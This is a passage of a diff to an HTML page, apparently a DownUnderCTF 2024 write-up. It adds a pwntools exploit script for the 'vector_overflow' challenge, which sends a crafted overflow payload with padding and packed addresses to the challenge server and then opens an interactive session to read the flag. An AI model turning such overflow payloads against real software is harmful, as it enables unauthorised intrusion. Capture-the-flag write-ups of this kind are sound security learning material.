+<span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elfexe</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./vector_overflow&#39;</span><span class="p">)</span> 
+<span class="n">libc</span> <span class="o">=</span> <span class="n">elfexe</span><span class="o">.</span><span class="n">libc</span>
+
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;warn&#39;</span>
+
+<span class="n">arguments</span> <span class="o">=</span> <span class="p">[]</span>
+<span class="k">if</span> <span class="n">args</span><span class="p">[</span><span class="s1">&#39;REMOTE&#39;</span><span class="p">]:</span> <span class="c1"># if REMOTE argument provided, connect to the challenge server, otherwise launch binary locally</span>
+    <span class="n">remote_server</span> <span class="o">=</span> <span class="s1">&#39;2024.ductf.dev&#39;</span>
+    <span class="n">remote_port</span> <span class="o">=</span> <span class="mi">30013</span>
+    <span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">remote_server</span><span class="p">,</span> <span class="n">remote_port</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">(</span><span class="n">arguments</span><span class="p">)</span>
+
+<span class="n">paylod</span> <span class="o">=</span> <span class="n">flat</span><span class="p">(</span>  <span class="c1"># build payload</span>
+    <span class="sa">b</span><span class="s1">&#39;DUCTF</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">,</span>
+    <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span> <span class="o">*</span> <span class="mi">10</span><span class="p">,</span>
+    <span class="n">pack</span><span class="p">(</span><span class="mh">0x4051e0</span><span class="p">),</span>
+    <span class="n">pack</span><span class="p">(</span><span class="mh">0x4051e0</span> <span class="o">+</span> <span class="mi">5</span><span class="p">)</span>
+<span class="p">)</span>
+<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">paylod</span><span class="p">)</span> <span class="c1"># send to server/binary</span>
+
+<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span> <span class="c1"># switch to interactive mode when you got the shell, you can now use `ls`, `cat flag.txt`</span>
+<span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</code></pre></div></td></tr></table></div>
+</details>
 <h2 id="epilogue">Epilogue<a class="headerlink" href="#epilogue" title="Permanent link">&para;</a></h2>
 <ul>
 <li>Official website: <a href="https://downunderctf.com/">https://downunderctf.com/</a></li>
@@ -379,6 +858,28 @@
       
         <footer class="md-footer">
   
+    
+      
+      <nav class="md-footer__inner md-grid" aria-label="Footer" >
+        
+          
+          <a href="../transmissions/" class="md-footer__link md-footer__link--prev" aria-label="Previous: Intercepted transmissions">
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
+            </div>
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              <div class="md-ellipsis">
+                Intercepted transmissions
+              </div>
+            </div>
+          </a>
+        
+        
+      </nav>
     
   
   <div class="md-footer-meta md-typeset">
